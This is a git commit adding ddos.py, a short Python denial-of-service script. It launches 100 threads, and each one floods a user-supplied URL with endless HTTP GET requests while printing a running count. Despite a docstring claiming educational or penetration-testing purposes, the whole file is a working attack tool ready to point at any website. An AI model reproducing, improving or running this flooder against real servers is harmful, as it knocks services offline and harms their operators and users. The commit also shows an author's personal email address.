c84ed8eb73899d0cefcbc34b2da693be98e03b94
Omar <omarmammadli.newschoolgeorgia@gmail.com>
2022-05-25 18:08:58 +0200

    working

---
+++ ddos.py
@@ -0,0 +1,51 @@
+"""
+This script is purely for educational/penetration testing purposes.
+
+I am not responsible for any potential damage caused, it is the user's responsibility to make the right decisions.
+
+"""
+
+import requests
+import time
+import sys
+import threading
+from itertools import count
+from colorama import Fore
+
+def green(text):
+    return Fore.GREEN + text + Fore.RESET
+
+def make_request(url, count=count()):
+    while True:
+        code = requests.get(url).status_code
+
+        if code == 200:
+            print(green(f"[+] request successful; total requests: {str(next(count) + 1)}"))
+
+        elif code == 404:
+            print(green("[!] request failed: page not found"))
+            exit()
+    
+        else:
+            print(green(f"[!] request failed with code: {code}; continuing"))
+
+if __name__ == '__main__':
+    threads = []
+    try:
+        url = sys.argv[1]
+
+    except IndexError:
+        url = input(green("\nenter the url of the target page: "))
+
+    print(green("\n[*] initialising... please wait\n"))
+
+    for i in range(100):
+        t = threading.Thread(target=make_request, args=[url])
+        t.daemon = True
+        threads.append(t)
+
+    for i in range(100):
+        threads[i].start()
+    
+    for i in range(100):
+        threads[i].join()
